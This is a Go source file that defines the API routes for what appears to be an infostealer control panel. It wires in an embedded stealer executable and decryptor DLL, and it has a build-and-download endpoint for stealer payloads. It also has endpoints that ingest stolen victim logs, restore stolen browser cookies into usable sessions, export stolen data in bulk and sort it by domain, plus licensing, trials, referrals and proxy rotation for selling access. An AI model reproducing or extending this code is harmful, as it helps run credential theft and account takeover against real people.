package api

import (
	"context"
	"database/sql"
	"net/http"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/user/mirage-panel/internal/auth"
	"github.com/user/mirage-panel/internal/middleware"
	"github.com/user/mirage-panel/internal/services"
	"github.com/user/mirage-panel/internal/ws"
)

type ctxKey string

const claimsKey ctxKey = "claims"

func AuthMiddleware(secret string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			header := r.Header.Get("Authorization")
			if header == "" || !strings.HasPrefix(header, "Bearer ") {
				writeError(w, http.StatusUnauthorized, "missing or invalid authorization header")
				return
			}

			tokenStr := strings.TrimPrefix(header, "Bearer ")
			claims, err := auth.ValidateToken(tokenStr, secret)
			if err != nil {
				writeError(w, http.StatusUnauthorized, "invalid or expired token")
				return
			}

			ctx := context.WithValue(r.Context(), claimsKey, claims)
			ctx = middleware.ContextWithClaims(ctx, claims)
			next.ServeHTTP(w, r.WithContext(ctx))
		})
	}
}

func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte) {
	authHandler := NewAuthHandler(db, jwtSecret)
	usersHandler := NewUsersHandler(db, jwtSecret)
	statsHandler := NewStatsHandler(db, hub)
	logProc := services.NewLogProcessor(db, hub)
	logsHandler := NewLogsHandler(logProc)
	sessionsHandler := NewSessionsHandler(db)
	searchHandler := NewSearchHandler(db)
	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db)
	notesHandler := NewNotesHandler(db)
	exportHandler := NewExportHandler(db)
	settingsHandler := NewSettingsHandler(db, jwtSecret)
	restoreHandler := NewRestoreHandler(db)
	chatHandler := NewChatHandler(db, hub)
	ticketHandler := NewTicketHandler(db)
	marketplaceHandler := NewMarketplaceHandler(db)
	totpHandler := NewTOTPHandler(db)
	sessMgmtHandler := NewSessionMgmtHandler(db)
	apiKeyHandler := NewAPIKeyHandler(db)
	docsHandler := NewDocsHandler()
	publicStatsHandler := NewPublicStatsHandler(db)
	pricingHandler := NewPricingHandler(db)
	referralHandler := NewReferralHandler(db)

	r.Group(func(r chi.Router) {
		r.Post("/api/auth/login", authHandler.Login)
		r.Post("/api/auth/register", usersHandler.Register)
		r.Post("/api/auth/2fa/verify-login", authHandler.VerifyLogin)
		r.Get("/api/auth/2fa/required", totpHandler.Required)
		r.Get("/api/public/stats", publicStatsHandler.GetPublicStats)
		r.Get("/api/pricing", pricingHandler.ListTiers)
	})

	r.Group(func(r chi.Router) {
		r.Use(AuthMiddleware(jwtSecret))

		// TOTP
		r.Post("/api/auth/2fa/setup", totpHandler.Setup)
		r.Post("/api/auth/2fa/verify", totpHandler.Verify)
		r.Post("/api/auth/2fa/disable", totpHandler.Disable)

		// Session management
		r.Get("/api/auth/sessions", sessMgmtHandler.List)
		r.Delete("/api/auth/sessions/{id}", sessMgmtHandler.Terminate)
		r.Delete("/api/auth/sessions", sessMgmtHandler.TerminateAll)

		// API keys
		r.Post("/api/keys", apiKeyHandler.Create)
		r.Get("/api/keys", apiKeyHandler.List)
		r.Delete("/api/keys/{id}", apiKeyHandler.Delete)

		r.Get("/api/stats", statsHandler.Dashboard)

		// Docs (auth required)
		r.Get("/api/docs", docsHandler.List)
		r.Get("/api/docs/*", docsHandler.Get)

		r.Get("/api/sessions", sessionsHandler.List)
		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)

		r.Get("/api/search", searchHandler.Search)
		r.Get("/api/search/advanced", searchHandler.AdvancedSearch)

		detectHandler := NewDuplicateDetectHandler(db)
		r.Get("/api/detect/duplicates", detectHandler.Detect)

		domainDetectHandler := NewDomainDetectHandler(db)
		r.Get("/api/domain-detect", domainDetectHandler.List)
		r.Post("/api/domain-detect", domainDetectHandler.Create)
		r.Delete("/api/domain-detect/{id}", domainDetectHandler.Delete)
		r.Post("/api/sessions/{id}/auto-tag", domainDetectHandler.AutoTag)

		r.Get("/api/filter-presets", NewFilterPresetsHandler(db).List)

		r.Patch("/api/sessions/{id}/viewed", sessionsHandler.MarkViewed)

		r.Post("/api/log", logsHandler.Ingest)
		r.Post("/api/log/chunk", logsHandler.Chunk)
		r.Post("/api/log/complete", logsHandler.CompleteChunked)

		sspHandler := NewSSPHandler(logProc)
		r.Post("/api/log/ssp", sspHandler.ProcessSSP)

		r.Route("/api/build", func(r chi.Router) {
			r.Post("/", buildHandler.Build)
			r.Get("/", buildHandler.List)
			r.Get("/{id}/download", buildHandler.Download)
		})

		r.Get("/api/sessions/{id}/notes", notesHandler.List)
		r.Post("/api/sessions/{id}/notes", notesHandler.Create)
		r.Delete("/api/notes/{id}", notesHandler.Delete)

		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
		r.Post("/api/export/bulk", exportHandler.ExportBulk)

		r.Get("/api/settings", settingsHandler.Get)
		r.Put("/api/settings", settingsHandler.Update)

		// Cookie restore
		r.Post("/api/restore/cookies", restoreHandler.Restore)
		r.Post("/api/restore/cookies/upload", restoreHandler.UploadCookies)
		r.Get("/api/restore/sessions", restoreHandler.ListSessions)
		r.Get("/api/restore/sessions/{id}", restoreHandler.SessionStatus)

		r.With(middleware.RequireRole("admin")).Get("/api/users", usersHandler.List)
		r.With(middleware.RequireRole("admin")).Post("/api/users/invite", usersHandler.CreateInvite)

		// Chat
		r.Get("/api/chat/messages", chatHandler.List)
		r.Post("/api/chat/messages", chatHandler.Send)
		r.With(middleware.RequireRole("admin")).Delete("/api/chat/messages/{id}", chatHandler.Delete)

		// Support Tickets
		r.Post("/api/support/tickets", ticketHandler.Create)
		r.Get("/api/support/tickets", ticketHandler.List)
		r.Get("/api/support/tickets/{id}", ticketHandler.Get)
		r.Post("/api/support/tickets/{id}/reply", ticketHandler.Reply)
		r.Post("/api/support/tickets/{id}/close", ticketHandler.Close)

		// Marketplace
		r.Get("/api/marketplace/products", marketplaceHandler.ListProducts)
		r.Post("/api/marketplace/purchase", marketplaceHandler.Purchase)
		r.Post("/api/marketplace/activate", marketplaceHandler.Activate)
		r.Get("/api/marketplace/purchases", marketplaceHandler.MyPurchases)
		r.Post("/api/marketplace/renew", marketplaceHandler.RenewLicense)
		r.Post("/api/marketplace/upgrade", marketplaceHandler.UpgradeLicense)
		r.Get("/api/marketplace/license-status", marketplaceHandler.LicenseStatus)
		r.Post("/api/auth/start-trial", marketplaceHandler.StartTrial)
		r.With(middleware.RequireRole("admin")).Post("/api/marketplace/products", marketplaceHandler.CreateProduct)
		r.With(middleware.RequireRole("admin")).Delete("/api/marketplace/products/{id}", marketplaceHandler.DeleteProduct)

		// Pricing & License features
		r.Get("/api/license/features", pricingHandler.MyFeatures)

		// Referrals
		r.Get("/api/referrals/code", referralHandler.GetCode)
		r.Post("/api/referrals/apply", referralHandler.Apply)
		r.Get("/api/referrals/stats", referralHandler.Stats)

		// Proxies
		rotator := services.NewProxyRotator(nil)
		store := services.NewSettingsStore(
			func(key string) (string, error) {
				var val string
				err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val)
				return val, err
			},
			func(key, value string) error {
				_, err := db.Exec("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
				return err
			},
		)
		if entries, err := services.LoadProxies(store); err == nil {
			for _, e := range entries {
				rotator.Add(e)
			}
		}
		proxyHandler := services.NewProxyRotatorHandler(rotator, store)
		go rotator.HealthCheck(context.Background(), 5*time.Minute)

		r.With(middleware.RequireRole("admin")).Get("/api/proxies", proxyHandler.ListProxies)
		r.With(middleware.RequireRole("admin")).Post("/api/proxies", proxyHandler.AddProxy)
		r.With(middleware.RequireRole("admin")).Delete("/api/proxies/{id}", proxyHandler.DeleteProxy)
	})
}
